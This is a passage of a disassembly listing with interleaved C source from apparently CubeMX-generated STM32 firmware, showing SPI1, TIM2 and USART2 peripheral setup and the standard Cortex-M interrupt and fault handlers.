  hspi1.Init.CRCLength = SPI_CRC_LENGTH_DATASIZE;
 8000eae:	4b08      	ldr	r3, [pc, #32]	; (8000ed0 <MX_SPI1_Init+0x74>)
 8000eb0:	2200      	movs	r2, #0
 8000eb2:	631a      	str	r2, [r3, #48]	; 0x30
  hspi1.Init.NSSPMode = SPI_NSS_PULSE_ENABLE;
 8000eb4:	4b06      	ldr	r3, [pc, #24]	; (8000ed0 <MX_SPI1_Init+0x74>)
 8000eb6:	2208      	movs	r2, #8
 8000eb8:	635a      	str	r2, [r3, #52]	; 0x34
  if (HAL_SPI_Init(&hspi1) != HAL_OK)
 8000eba:	4805      	ldr	r0, [pc, #20]	; (8000ed0 <MX_SPI1_Init+0x74>)
 8000ebc:	f003 ff14 	bl	8004ce8 <HAL_SPI_Init>
 8000ec0:	4603      	mov	r3, r0
 8000ec2:	2b00      	cmp	r3, #0
 8000ec4:	d001      	beq.n	8000eca <MX_SPI1_Init+0x6e>
  {
    Error_Handler();
 8000ec6:	f7ff ffc3 	bl	8000e50 <Error_Handler>
  }
  /* USER CODE BEGIN SPI1_Init 2 */

  /* USER CODE END SPI1_Init 2 */

}
 8000eca:	bf00      	nop
 8000ecc:	bd80      	pop	{r7, pc}
 8000ece:	bf00      	nop
 8000ed0:	20000280 	.word	0x20000280
 8000ed4:	40013000 	.word	0x40013000

08000ed8 <HAL_SPI_MspInit>:

void HAL_SPI_MspInit(SPI_HandleTypeDef* spiHandle)
{
 8000ed8:	b580      	push	{r7, lr}
 8000eda:	b08a      	sub	sp, #40	; 0x28
 8000edc:	af00      	add	r7, sp, #0
 8000ede:	6078      	str	r0, [r7, #4]

  GPIO_InitTypeDef GPIO_InitStruct = {0};
 8000ee0:	f107 0314 	add.w	r3, r7, #20
 8000ee4:	2200      	movs	r2, #0
 8000ee6:	601a      	str	r2, [r3, #0]
 8000ee8:	605a      	str	r2, [r3, #4]
 8000eea:	609a      	str	r2, [r3, #8]
 8000eec:	60da      	str	r2, [r3, #12]
 8000eee:	611a      	str	r2, [r3, #16]
  if(spiHandle->Instance==SPI1)
 8000ef0:	687b      	ldr	r3, [r7, #4]
 8000ef2:	681b      	ldr	r3, [r3, #0]
 8000ef4:	4a17      	ldr	r2, [pc, #92]	; (8000f54 <HAL_SPI_MspInit+0x7c>)
 8000ef6:	4293      	cmp	r3, r2
 8000ef8:	d128      	bne.n	8000f4c <HAL_SPI_MspInit+0x74>
  {
  /* USER CODE BEGIN SPI1_MspInit 0 */

  /* USER CODE END SPI1_MspInit 0 */
    /* SPI1 clock enable */
    __HAL_RCC_SPI1_CLK_ENABLE();
 8000efa:	4b17      	ldr	r3, [pc, #92]	; (8000f58 <HAL_SPI_MspInit+0x80>)
 8000efc:	6e1b      	ldr	r3, [r3, #96]	; 0x60
 8000efe:	4a16      	ldr	r2, [pc, #88]	; (8000f58 <HAL_SPI_MspInit+0x80>)
 8000f00:	f443 5380 	orr.w	r3, r3, #4096	; 0x1000
 8000f04:	6613      	str	r3, [r2, #96]	; 0x60
 8000f06:	4b14      	ldr	r3, [pc, #80]	; (8000f58 <HAL_SPI_MspInit+0x80>)
 8000f08:	6e1b      	ldr	r3, [r3, #96]	; 0x60
 8000f0a:	f403 5380 	and.w	r3, r3, #4096	; 0x1000
 8000f0e:	613b      	str	r3, [r7, #16]
 8000f10:	693b      	ldr	r3, [r7, #16]

    __HAL_RCC_GPIOA_CLK_ENABLE();
 8000f12:	4b11      	ldr	r3, [pc, #68]	; (8000f58 <HAL_SPI_MspInit+0x80>)
 8000f14:	6cdb      	ldr	r3, [r3, #76]	; 0x4c
 8000f16:	4a10      	ldr	r2, [pc, #64]	; (8000f58 <HAL_SPI_MspInit+0x80>)
 8000f18:	f043 0301 	orr.w	r3, r3, #1
 8000f1c:	64d3      	str	r3, [r2, #76]	; 0x4c
 8000f1e:	4b0e      	ldr	r3, [pc, #56]	; (8000f58 <HAL_SPI_MspInit+0x80>)
 8000f20:	6cdb      	ldr	r3, [r3, #76]	; 0x4c
 8000f22:	f003 0301 	and.w	r3, r3, #1
 8000f26:	60fb      	str	r3, [r7, #12]
 8000f28:	68fb      	ldr	r3, [r7, #12]
    /**SPI1 GPIO Configuration
    PA1     ------> SPI1_SCK
    PA6     ------> SPI1_MISO
    PA7     ------> SPI1_MOSI
    */
    GPIO_InitStruct.Pin = GPIO_PIN_1|GPIO_PIN_6|GPIO_PIN_7;
 8000f2a:	23c2      	movs	r3, #194	; 0xc2
 8000f2c:	617b      	str	r3, [r7, #20]
    GPIO_InitStruct.Mode = GPIO_MODE_AF_PP;
 8000f2e:	2302      	movs	r3, #2
 8000f30:	61bb      	str	r3, [r7, #24]
    GPIO_InitStruct.Pull = GPIO_NOPULL;
 8000f32:	2300      	movs	r3, #0
 8000f34:	61fb      	str	r3, [r7, #28]
    GPIO_InitStruct.Speed = GPIO_SPEED_FREQ_VERY_HIGH;
 8000f36:	2303      	movs	r3, #3
 8000f38:	623b      	str	r3, [r7, #32]
    GPIO_InitStruct.Alternate = GPIO_AF5_SPI1;
 8000f3a:	2305      	movs	r3, #5
 8000f3c:	627b      	str	r3, [r7, #36]	; 0x24
    HAL_GPIO_Init(GPIOA, &GPIO_InitStruct);
 8000f3e:	f107 0314 	add.w	r3, r7, #20
 8000f42:	4619      	mov	r1, r3
 8000f44:	f04f 4090 	mov.w	r0, #1207959552	; 0x48000000
 8000f48:	f000 fdd4 	bl	8001af4 <HAL_GPIO_Init>

  /* USER CODE BEGIN SPI1_MspInit 1 */

  /* USER CODE END SPI1_MspInit 1 */
  }
}
 8000f4c:	bf00      	nop
 8000f4e:	3728      	adds	r7, #40	; 0x28
 8000f50:	46bd      	mov	sp, r7
 8000f52:	bd80      	pop	{r7, pc}
 8000f54:	40013000 	.word	0x40013000
 8000f58:	40021000 	.word	0x40021000

08000f5c <HAL_MspInit>:
/* USER CODE END 0 */
/**
  * Initializes the Global MSP.
  */
void HAL_MspInit(void)
{
 8000f5c:	b480      	push	{r7}
 8000f5e:	b083      	sub	sp, #12
 8000f60:	af00      	add	r7, sp, #0
  /* USER CODE BEGIN MspInit 0 */

  /* USER CODE END MspInit 0 */

  __HAL_RCC_SYSCFG_CLK_ENABLE();
 8000f62:	4b0f      	ldr	r3, [pc, #60]	; (8000fa0 <HAL_MspInit+0x44>)
 8000f64:	6e1b      	ldr	r3, [r3, #96]	; 0x60
 8000f66:	4a0e      	ldr	r2, [pc, #56]	; (8000fa0 <HAL_MspInit+0x44>)
 8000f68:	f043 0301 	orr.w	r3, r3, #1
 8000f6c:	6613      	str	r3, [r2, #96]	; 0x60
 8000f6e:	4b0c      	ldr	r3, [pc, #48]	; (8000fa0 <HAL_MspInit+0x44>)
 8000f70:	6e1b      	ldr	r3, [r3, #96]	; 0x60
 8000f72:	f003 0301 	and.w	r3, r3, #1
 8000f76:	607b      	str	r3, [r7, #4]
 8000f78:	687b      	ldr	r3, [r7, #4]
  __HAL_RCC_PWR_CLK_ENABLE();
 8000f7a:	4b09      	ldr	r3, [pc, #36]	; (8000fa0 <HAL_MspInit+0x44>)
 8000f7c:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 8000f7e:	4a08      	ldr	r2, [pc, #32]	; (8000fa0 <HAL_MspInit+0x44>)
 8000f80:	f043 5380 	orr.w	r3, r3, #268435456	; 0x10000000
 8000f84:	6593      	str	r3, [r2, #88]	; 0x58
 8000f86:	4b06      	ldr	r3, [pc, #24]	; (8000fa0 <HAL_MspInit+0x44>)
 8000f88:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 8000f8a:	f003 5380 	and.w	r3, r3, #268435456	; 0x10000000
 8000f8e:	603b      	str	r3, [r7, #0]
 8000f90:	683b      	ldr	r3, [r7, #0]
  /* System interrupt init*/

  /* USER CODE BEGIN MspInit 1 */

  /* USER CODE END MspInit 1 */
}
 8000f92:	bf00      	nop
 8000f94:	370c      	adds	r7, #12
 8000f96:	46bd      	mov	sp, r7
 8000f98:	f85d 7b04 	ldr.w	r7, [sp], #4
 8000f9c:	4770      	bx	lr
 8000f9e:	bf00      	nop
 8000fa0:	40021000 	.word	0x40021000

08000fa4 <NMI_Handler>:
/******************************************************************************/
/**
  * @brief This function handles Non maskable interrupt.
  */
void NMI_Handler(void)
{
 8000fa4:	b480      	push	{r7}
 8000fa6:	af00      	add	r7, sp, #0
  /* USER CODE BEGIN NonMaskableInt_IRQn 0 */

  /* USER CODE END NonMaskableInt_IRQn 0 */
  /* USER CODE BEGIN NonMaskableInt_IRQn 1 */
   while (1)
 8000fa8:	e7fe      	b.n	8000fa8 <NMI_Handler+0x4>

08000faa <HardFault_Handler>:

/**
  * @brief This function handles Hard fault interrupt.
  */
void HardFault_Handler(void)
{
 8000faa:	b480      	push	{r7}
 8000fac:	af00      	add	r7, sp, #0
  /* USER CODE BEGIN HardFault_IRQn 0 */

  /* USER CODE END HardFault_IRQn 0 */
  while (1)
 8000fae:	e7fe      	b.n	8000fae <HardFault_Handler+0x4>

08000fb0 <MemManage_Handler>:

/**
  * @brief This function handles Memory management fault.
  */
void MemManage_Handler(void)
{
 8000fb0:	b480      	push	{r7}
 8000fb2:	af00      	add	r7, sp, #0
  /* USER CODE BEGIN MemoryManagement_IRQn 0 */

  /* USER CODE END MemoryManagement_IRQn 0 */
  while (1)
 8000fb4:	e7fe      	b.n	8000fb4 <MemManage_Handler+0x4>

08000fb6 <BusFault_Handler>:

/**
  * @brief This function handles Prefetch fault, memory access fault.
  */
void BusFault_Handler(void)
{
 8000fb6:	b480      	push	{r7}
 8000fb8:	af00      	add	r7, sp, #0
  /* USER CODE BEGIN BusFault_IRQn 0 */

  /* USER CODE END BusFault_IRQn 0 */
  while (1)
 8000fba:	e7fe      	b.n	8000fba <BusFault_Handler+0x4>

08000fbc <UsageFault_Handler>:

/**
  * @brief This function handles Undefined instruction or illegal state.
  */
void UsageFault_Handler(void)
{
 8000fbc:	b480      	push	{r7}
 8000fbe:	af00      	add	r7, sp, #0
  /* USER CODE BEGIN UsageFault_IRQn 0 */

  /* USER CODE END UsageFault_IRQn 0 */
  while (1)
 8000fc0:	e7fe      	b.n	8000fc0 <UsageFault_Handler+0x4>

08000fc2 <SVC_Handler>:

/**
  * @brief This function handles System service call via SWI instruction.
  */
void SVC_Handler(void)
{
 8000fc2:	b480      	push	{r7}
 8000fc4:	af00      	add	r7, sp, #0

  /* USER CODE END SVCall_IRQn 0 */
  /* USER CODE BEGIN SVCall_IRQn 1 */

  /* USER CODE END SVCall_IRQn 1 */
}
 8000fc6:	bf00      	nop
 8000fc8:	46bd      	mov	sp, r7
 8000fca:	f85d 7b04 	ldr.w	r7, [sp], #4
 8000fce:	4770      	bx	lr

08000fd0 <DebugMon_Handler>:

/**
  * @brief This function handles Debug monitor.
  */
void DebugMon_Handler(void)
{
 8000fd0:	b480      	push	{r7}
 8000fd2:	af00      	add	r7, sp, #0

  /* USER CODE END DebugMonitor_IRQn 0 */
  /* USER CODE BEGIN DebugMonitor_IRQn 1 */

  /* USER CODE END DebugMonitor_IRQn 1 */
}
 8000fd4:	bf00      	nop
 8000fd6:	46bd      	mov	sp, r7
 8000fd8:	f85d 7b04 	ldr.w	r7, [sp], #4
 8000fdc:	4770      	bx	lr

08000fde <PendSV_Handler>:

/**
  * @brief This function handles Pendable request for system service.
  */
void PendSV_Handler(void)
{
 8000fde:	b480      	push	{r7}
 8000fe0:	af00      	add	r7, sp, #0

  /* USER CODE END PendSV_IRQn 0 */
  /* USER CODE BEGIN PendSV_IRQn 1 */

  /* USER CODE END PendSV_IRQn 1 */
}
 8000fe2:	bf00      	nop
 8000fe4:	46bd      	mov	sp, r7
 8000fe6:	f85d 7b04 	ldr.w	r7, [sp], #4
 8000fea:	4770      	bx	lr

08000fec <SysTick_Handler>:

/**
  * @brief This function handles System tick timer.
  */
void SysTick_Handler(void)
{
 8000fec:	b580      	push	{r7, lr}
 8000fee:	af00      	add	r7, sp, #0
  /* USER CODE BEGIN SysTick_IRQn 0 */

  /* USER CODE END SysTick_IRQn 0 */
  HAL_IncTick();
 8000ff0:	f000 f9b2 	bl	8001358 <HAL_IncTick>
  /* USER CODE BEGIN SysTick_IRQn 1 */

  /* USER CODE END SysTick_IRQn 1 */
}
 8000ff4:	bf00      	nop
 8000ff6:	bd80      	pop	{r7, pc}

08000ff8 <TIM2_IRQHandler>:

/**
  * @brief This function handles TIM2 global interrupt.
  */
void TIM2_IRQHandler(void)
{
 8000ff8:	b580      	push	{r7, lr}
 8000ffa:	af00      	add	r7, sp, #0
  /* USER CODE BEGIN TIM2_IRQn 0 */

  /* USER CODE END TIM2_IRQn 0 */
  HAL_TIM_IRQHandler(&htim2);
 8000ffc:	4802      	ldr	r0, [pc, #8]	; (8001008 <TIM2_IRQHandler+0x10>)
 8000ffe:	f003 ffc1 	bl	8004f84 <HAL_TIM_IRQHandler>
  /* USER CODE BEGIN TIM2_IRQn 1 */

  /* USER CODE END TIM2_IRQn 1 */
}
 8001002:	bf00      	nop
 8001004:	bd80      	pop	{r7, pc}
 8001006:	bf00      	nop
 8001008:	200002e4 	.word	0x200002e4

0800100c <USB_IRQHandler>:

/**
  * @brief This function handles USB event interrupt through EXTI line 17.
  */
void USB_IRQHandler(void)
{
 800100c:	b580      	push	{r7, lr}
 800100e:	af00      	add	r7, sp, #0
  /* USER CODE BEGIN USB_IRQn 0 */

  /* USER CODE END USB_IRQn 0 */
  HAL_PCD_IRQHandler(&hpcd_USB_FS);
 8001010:	4802      	ldr	r0, [pc, #8]	; (800101c <USB_IRQHandler+0x10>)
 8001012:	f001 f819 	bl	8002048 <HAL_PCD_IRQHandler>
  /* USER CODE BEGIN USB_IRQn 1 */

  /* USER CODE END USB_IRQn 1 */
}
 8001016:	bf00      	nop
 8001018:	bd80      	pop	{r7, pc}
 800101a:	bf00      	nop
 800101c:	20000b7c 	.word	0x20000b7c

08001020 <SystemInit>:
  * @brief  Setup the microcontroller system.
  * @retval None
  */

void SystemInit(void)
{
 8001020:	b480      	push	{r7}
 8001022:	af00      	add	r7, sp, #0
  SCB->VTOR = VECT_TAB_BASE_ADDRESS | VECT_TAB_OFFSET;
#endif

  /* FPU settings ------------------------------------------------------------*/
#if (__FPU_PRESENT == 1) && (__FPU_USED == 1)
  SCB->CPACR |= ((3UL << 20U)|(3UL << 22U));  /* set CP10 and CP11 Full Access */
 8001024:	4b06      	ldr	r3, [pc, #24]	; (8001040 <SystemInit+0x20>)
 8001026:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 800102a:	4a05      	ldr	r2, [pc, #20]	; (8001040 <SystemInit+0x20>)
 800102c:	f443 0370 	orr.w	r3, r3, #15728640	; 0xf00000
 8001030:	f8c2 3088 	str.w	r3, [r2, #136]	; 0x88
#endif
}
 8001034:	bf00      	nop
 8001036:	46bd      	mov	sp, r7
 8001038:	f85d 7b04 	ldr.w	r7, [sp], #4
 800103c:	4770      	bx	lr
 800103e:	bf00      	nop
 8001040:	e000ed00 	.word	0xe000ed00

08001044 <MX_TIM2_Init>:

TIM_HandleTypeDef htim2;

/* TIM2 init function */
void MX_TIM2_Init(void)
{
 8001044:	b580      	push	{r7, lr}
 8001046:	b088      	sub	sp, #32
 8001048:	af00      	add	r7, sp, #0

  /* USER CODE BEGIN TIM2_Init 0 */

  /* USER CODE END TIM2_Init 0 */

  TIM_ClockConfigTypeDef sClockSourceConfig = {0};
 800104a:	f107 0310 	add.w	r3, r7, #16
 800104e:	2200      	movs	r2, #0
 8001050:	601a      	str	r2, [r3, #0]
 8001052:	605a      	str	r2, [r3, #4]
 8001054:	609a      	str	r2, [r3, #8]
 8001056:	60da      	str	r2, [r3, #12]
  TIM_MasterConfigTypeDef sMasterConfig = {0};
 8001058:	1d3b      	adds	r3, r7, #4
 800105a:	2200      	movs	r2, #0
 800105c:	601a      	str	r2, [r3, #0]
 800105e:	605a      	str	r2, [r3, #4]
 8001060:	609a      	str	r2, [r3, #8]

  /* USER CODE BEGIN TIM2_Init 1 */

  /* USER CODE END TIM2_Init 1 */
  htim2.Instance = TIM2;
 8001062:	4b1e      	ldr	r3, [pc, #120]	; (80010dc <MX_TIM2_Init+0x98>)
 8001064:	f04f 4280 	mov.w	r2, #1073741824	; 0x40000000
 8001068:	601a      	str	r2, [r3, #0]
  htim2.Init.Prescaler = 7199;
 800106a:	4b1c      	ldr	r3, [pc, #112]	; (80010dc <MX_TIM2_Init+0x98>)
 800106c:	f641 421f 	movw	r2, #7199	; 0x1c1f
 8001070:	605a      	str	r2, [r3, #4]
  htim2.Init.CounterMode = TIM_COUNTERMODE_UP;
 8001072:	4b1a      	ldr	r3, [pc, #104]	; (80010dc <MX_TIM2_Init+0x98>)
 8001074:	2200      	movs	r2, #0
 8001076:	609a      	str	r2, [r3, #8]
  htim2.Init.Period = 399;
 8001078:	4b18      	ldr	r3, [pc, #96]	; (80010dc <MX_TIM2_Init+0x98>)
 800107a:	f240 128f 	movw	r2, #399	; 0x18f
 800107e:	60da      	str	r2, [r3, #12]
  htim2.Init.ClockDivision = TIM_CLOCKDIVISION_DIV1;
 8001080:	4b16      	ldr	r3, [pc, #88]	; (80010dc <MX_TIM2_Init+0x98>)
 8001082:	2200      	movs	r2, #0
 8001084:	611a      	str	r2, [r3, #16]
  htim2.Init.AutoReloadPreload = TIM_AUTORELOAD_PRELOAD_DISABLE;
 8001086:	4b15      	ldr	r3, [pc, #84]	; (80010dc <MX_TIM2_Init+0x98>)
 8001088:	2200      	movs	r2, #0
 800108a:	619a      	str	r2, [r3, #24]
  if (HAL_TIM_Base_Init(&htim2) != HAL_OK)
 800108c:	4813      	ldr	r0, [pc, #76]	; (80010dc <MX_TIM2_Init+0x98>)
 800108e:	f003 fece 	bl	8004e2e <HAL_TIM_Base_Init>
 8001092:	4603      	mov	r3, r0
 8001094:	2b00      	cmp	r3, #0
 8001096:	d001      	beq.n	800109c <MX_TIM2_Init+0x58>
  {
    Error_Handler();
 8001098:	f7ff feda 	bl	8000e50 <Error_Handler>
  }
  sClockSourceConfig.ClockSource = TIM_CLOCKSOURCE_INTERNAL;
 800109c:	f44f 5380 	mov.w	r3, #4096	; 0x1000
 80010a0:	613b      	str	r3, [r7, #16]
  if (HAL_TIM_ConfigClockSource(&htim2, &sClockSourceConfig) != HAL_OK)
 80010a2:	f107 0310 	add.w	r3, r7, #16
 80010a6:	4619      	mov	r1, r3
 80010a8:	480c      	ldr	r0, [pc, #48]	; (80010dc <MX_TIM2_Init+0x98>)
 80010aa:	f004 f86d 	bl	8005188 <HAL_TIM_ConfigClockSource>
 80010ae:	4603      	mov	r3, r0
 80010b0:	2b00      	cmp	r3, #0
 80010b2:	d001      	beq.n	80010b8 <MX_TIM2_Init+0x74>
  {
    Error_Handler();
 80010b4:	f7ff fecc 	bl	8000e50 <Error_Handler>
  }
  sMasterConfig.MasterOutputTrigger = TIM_TRGO_RESET;
 80010b8:	2300      	movs	r3, #0
 80010ba:	607b      	str	r3, [r7, #4]
  sMasterConfig.MasterSlaveMode = TIM_MASTERSLAVEMODE_DISABLE;
 80010bc:	2300      	movs	r3, #0
 80010be:	60fb      	str	r3, [r7, #12]
  if (HAL_TIMEx_MasterConfigSynchronization(&htim2, &sMasterConfig) != HAL_OK)
 80010c0:	1d3b      	adds	r3, r7, #4
 80010c2:	4619      	mov	r1, r3
 80010c4:	4805      	ldr	r0, [pc, #20]	; (80010dc <MX_TIM2_Init+0x98>)
 80010c6:	f004 fa4f 	bl	8005568 <HAL_TIMEx_MasterConfigSynchronization>
 80010ca:	4603      	mov	r3, r0
 80010cc:	2b00      	cmp	r3, #0
 80010ce:	d001      	beq.n	80010d4 <MX_TIM2_Init+0x90>
  {
    Error_Handler();
 80010d0:	f7ff febe 	bl	8000e50 <Error_Handler>
  }
  /* USER CODE BEGIN TIM2_Init 2 */

  /* USER CODE END TIM2_Init 2 */

}
 80010d4:	bf00      	nop
 80010d6:	3720      	adds	r7, #32
 80010d8:	46bd      	mov	sp, r7
 80010da:	bd80      	pop	{r7, pc}
 80010dc:	200002e4 	.word	0x200002e4

080010e0 <HAL_TIM_Base_MspInit>:

void HAL_TIM_Base_MspInit(TIM_HandleTypeDef* tim_baseHandle)
{
 80010e0:	b580      	push	{r7, lr}
 80010e2:	b084      	sub	sp, #16
 80010e4:	af00      	add	r7, sp, #0
 80010e6:	6078      	str	r0, [r7, #4]

  if(tim_baseHandle->Instance==TIM2)
 80010e8:	687b      	ldr	r3, [r7, #4]
 80010ea:	681b      	ldr	r3, [r3, #0]
 80010ec:	f1b3 4f80 	cmp.w	r3, #1073741824	; 0x40000000
 80010f0:	d113      	bne.n	800111a <HAL_TIM_Base_MspInit+0x3a>
  {
  /* USER CODE BEGIN TIM2_MspInit 0 */

  /* USER CODE END TIM2_MspInit 0 */
    /* TIM2 clock enable */
    __HAL_RCC_TIM2_CLK_ENABLE();
 80010f2:	4b0c      	ldr	r3, [pc, #48]	; (8001124 <HAL_TIM_Base_MspInit+0x44>)
 80010f4:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 80010f6:	4a0b      	ldr	r2, [pc, #44]	; (8001124 <HAL_TIM_Base_MspInit+0x44>)
 80010f8:	f043 0301 	orr.w	r3, r3, #1
 80010fc:	6593      	str	r3, [r2, #88]	; 0x58
 80010fe:	4b09      	ldr	r3, [pc, #36]	; (8001124 <HAL_TIM_Base_MspInit+0x44>)
 8001100:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 8001102:	f003 0301 	and.w	r3, r3, #1
 8001106:	60fb      	str	r3, [r7, #12]
 8001108:	68fb      	ldr	r3, [r7, #12]

    /* TIM2 interrupt Init */
    HAL_NVIC_SetPriority(TIM2_IRQn, 0, 0);
 800110a:	2200      	movs	r2, #0
 800110c:	2100      	movs	r1, #0
 800110e:	201c      	movs	r0, #28
 8001110:	f000 fa41 	bl	8001596 <HAL_NVIC_SetPriority>
    HAL_NVIC_EnableIRQ(TIM2_IRQn);
 8001114:	201c      	movs	r0, #28
 8001116:	f000 fa5a 	bl	80015ce <HAL_NVIC_EnableIRQ>
  /* USER CODE BEGIN TIM2_MspInit 1 */

  /* USER CODE END TIM2_MspInit 1 */
  }
}
 800111a:	bf00      	nop
 800111c:	3710      	adds	r7, #16
 800111e:	46bd      	mov	sp, r7
 8001120:	bd80      	pop	{r7, pc}
 8001122:	bf00      	nop
 8001124:	40021000 	.word	0x40021000

08001128 <MX_USART2_UART_Init>:
UART_HandleTypeDef huart2;

/* USART2 init function */

void MX_USART2_UART_Init(void)
{
 8001128:	b580      	push	{r7, lr}
 800112a:	af00      	add	r7, sp, #0
  /* USER CODE END USART2_Init 0 */

  /* USER CODE BEGIN USART2_Init 1 */

  /* USER CODE END USART2_Init 1 */
  huart2.Instance = USART2;
 800112c:	4b14      	ldr	r3, [pc, #80]	; (8001180 <MX_USART2_UART_Init+0x58>)
 800112e:	4a15      	ldr	r2, [pc, #84]	; (8001184 <MX_USART2_UART_Init+0x5c>)
 8001130:	601a      	str	r2, [r3, #0]
  huart2.Init.BaudRate = 115200;
 8001132:	4b13      	ldr	r3, [pc, #76]	; (8001180 <MX_USART2_UART_Init+0x58>)
 8001134:	f44f 32e1 	mov.w	r2, #115200	; 0x1c200
 8001138:	605a      	str	r2, [r3, #4]
  huart2.Init.WordLength = UART_WORDLENGTH_8B;
 800113a:	4b11      	ldr	r3, [pc, #68]	; (8001180 <MX_USART2_UART_Init+0x58>)
 800113c:	2200      	movs	r2, #0
 800113e:	609a      	str	r2, [r3, #8]
  huart2.Init.StopBits = UART_STOPBITS_1;
 8001140:	4b0f      	ldr	r3, [pc, #60]	; (8001180 <MX_USART2_UART_Init+0x58>)
 8001142:	2200      	movs	r2, #0
 8001144:	60da      	str	r2, [r3, #12]
  huart2.Init.Parity = UART_PARITY_NONE;
 8001146:	4b0e      	ldr	r3, [pc, #56]	; (8001180 <MX_USART2_UART_Init+0x58>)
 8001148:	2200      	movs	r2, #0
 800114a:	611a      	str	r2, [r3, #16]
  huart2.Init.Mode = UART_MODE_TX_RX;
 800114c:	4b0c      	ldr	r3, [pc, #48]	; (8001180 <MX_USART2_UART_Init+0x58>)
 800114e:	220c      	movs	r2, #12
 8001150:	615a      	str	r2, [r3, #20]
  huart2.Init.HwFlowCtl = UART_HWCONTROL_NONE;
 8001152:	4b0b      	ldr	r3, [pc, #44]	; (8001180 <MX_USART2_UART_Init+0x58>)
 8001154:	2200      	movs	r2, #0
 8001156:	619a      	str	r2, [r3, #24]
  huart2.Init.OverSampling = UART_OVERSAMPLING_16;
 8001158:	4b09      	ldr	r3, [pc, #36]	; (8001180 <MX_USART2_UART_Init+0x58>)
 800115a:	2200      	movs	r2, #0
 800115c:	61da      	str	r2, [r3, #28]
  huart2.Init.OneBitSampling = UART_ONE_BIT_SAMPLE_DISABLE;
 800115e:	4b08      	ldr	r3, [pc, #32]	; (8001180 <MX_USART2_UART_Init+0x58>)
 8001160:	2200      	movs	r2, #0
 8001162:	621a      	str	r2, [r3, #32]
  huart2.AdvancedInit.AdvFeatureInit = UART_ADVFEATURE_NO_INIT;
 8001164:	4b06      	ldr	r3, [pc, #24]	; (8001180 <MX_USART2_UART_Init+0x58>)
 8001166:	2200      	movs	r2, #0
 8001168:	625a      	str	r2, [r3, #36]	; 0x24
  if (HAL_UART_Init(&huart2) != HAL_OK)
 800116a:	4805      	ldr	r0, [pc, #20]	; (8001180 <MX_USART2_UART_Init+0x58>)
 800116c:	f004 fa80 	bl	8005670 <HAL_UART_Init>
 8001170:	4603      	mov	r3, r0
 8001172:	2b00      	cmp	r3, #0
 8001174:	d001      	beq.n	800117a <MX_USART2_UART_Init+0x52>
  {
    Error_Handler();
 8001176:	f7ff fe6b 	bl	8000e50 <Error_Handler>
  }
  /* USER CODE BEGIN USART2_Init 2 */

  /* USER CODE END USART2_Init 2 */

}
 800117a:	bf00      	nop
 800117c:	bd80      	pop	{r7, pc}
 800117e:	bf00      	nop
 8001180:	20000330 	.word	0x20000330
 8001184:	40004400 	.word	0x40004400

08001188 <HAL_UART_MspInit>:

void HAL_UART_MspInit(UART_HandleTypeDef* uartHandle)
{
 8001188:	b580      	push	{r7, lr}
 800118a:	b09e      	sub	sp, #120	; 0x78
 800118c:	af00      	add	r7, sp, #0
 800118e:	6078      	str	r0, [r7, #4]

  GPIO_InitTypeDef GPIO_InitStruct = {0};
 8001190:	f107 0364 	add.w	r3, r7, #100	; 0x64
 8001194:	2200      	movs	r2, #0
 8001196:	601a      	str	r2, [r3, #0]
 8001198:	605a      	str	r2, [r3, #4]
 800119a:	609a      	str	r2, [r3, #8]
 800119c:	60da      	str	r2, [r3, #12]
 800119e:	611a      	str	r2, [r3, #16]
  RCC_PeriphCLKInitTypeDef PeriphClkInit = {0};
 80011a0:	f107 0310 	add.w	r3, r7, #16
 80011a4:	2254      	movs	r2, #84	; 0x54
 80011a6:	2100      	movs	r1, #0
 80011a8:	4618      	mov	r0, r3
 80011aa:	f00b ffff 	bl	800d1ac <memset>
  if(uartHandle->Instance==USART2)
 80011ae:	687b      	ldr	r3, [r7, #4]
 80011b0:	681b      	ldr	r3, [r3, #0]
 80011b2:	4a28      	ldr	r2, [pc, #160]	; (8001254 <HAL_UART_MspInit+0xcc>)
 80011b4:	4293      	cmp	r3, r2
 80011b6:	d148      	bne.n	800124a <HAL_UART_MspInit+0xc2>

  /* USER CODE END USART2_MspInit 0 */

  /** Initializes the peripherals clock
  */
    PeriphClkInit.PeriphClockSelection = RCC_PERIPHCLK_USART2;
 80011b8:	2302      	movs	r3, #2
 80011ba:	613b      	str	r3, [r7, #16]
    PeriphClkInit.Usart2ClockSelection = RCC_USART2CLKSOURCE_PCLK1;
 80011bc:	2300      	movs	r3, #0
 80011be:	637b      	str	r3, [r7, #52]	; 0x34
    if (HAL_RCCEx_PeriphCLKConfig(&PeriphClkInit) != HAL_OK)
 80011c0:	f107 0310 	add.w	r3, r7, #16
 80011c4:	4618      	mov	r0, r3
 80011c6:	f003 fa97 	bl	80046f8 <HAL_RCCEx_PeriphCLKConfig>
 80011ca:	4603      	mov	r3, r0
 80011cc:	2b00      	cmp	r3, #0
 80011ce:	d001      	beq.n	80011d4 <HAL_UART_MspInit+0x4c>
    {
      Error_Handler();
 80011d0:	f7ff fe3e 	bl	8000e50 <Error_Handler>
    }

    /* USART2 clock enable */
    __HAL_RCC_USART2_CLK_ENABLE();
 80011d4:	4b20      	ldr	r3, [pc, #128]	; (8001258 <HAL_UART_MspInit+0xd0>)
 80011d6:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 80011d8:	4a1f      	ldr	r2, [pc, #124]	; (8001258 <HAL_UART_MspInit+0xd0>)
 80011da:	f443 3300 	orr.w	r3, r3, #131072	; 0x20000
 80011de:	6593      	str	r3, [r2, #88]	; 0x58
 80011e0:	4b1d      	ldr	r3, [pc, #116]	; (8001258 <HAL_UART_MspInit+0xd0>)
 80011e2:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 80011e4:	f403 3300 	and.w	r3, r3, #131072	; 0x20000
 80011e8:	60fb      	str	r3, [r7, #12]
 80011ea:	68fb      	ldr	r3, [r7, #12]

    __HAL_RCC_GPIOA_CLK_ENABLE();
 80011ec:	4b1a      	ldr	r3, [pc, #104]	; (8001258 <HAL_UART_MspInit+0xd0>)
 80011ee:	6cdb      	ldr	r3, [r3, #76]	; 0x4c
 80011f0:	4a19      	ldr	r2, [pc, #100]	; (8001258 <HAL_UART_MspInit+0xd0>)
 80011f2:	f043 0301 	orr.w	r3, r3, #1
 80011f6:	64d3      	str	r3, [r2, #76]	; 0x4c
 80011f8:	4b17      	ldr	r3, [pc, #92]	; (8001258 <HAL_UART_MspInit+0xd0>)
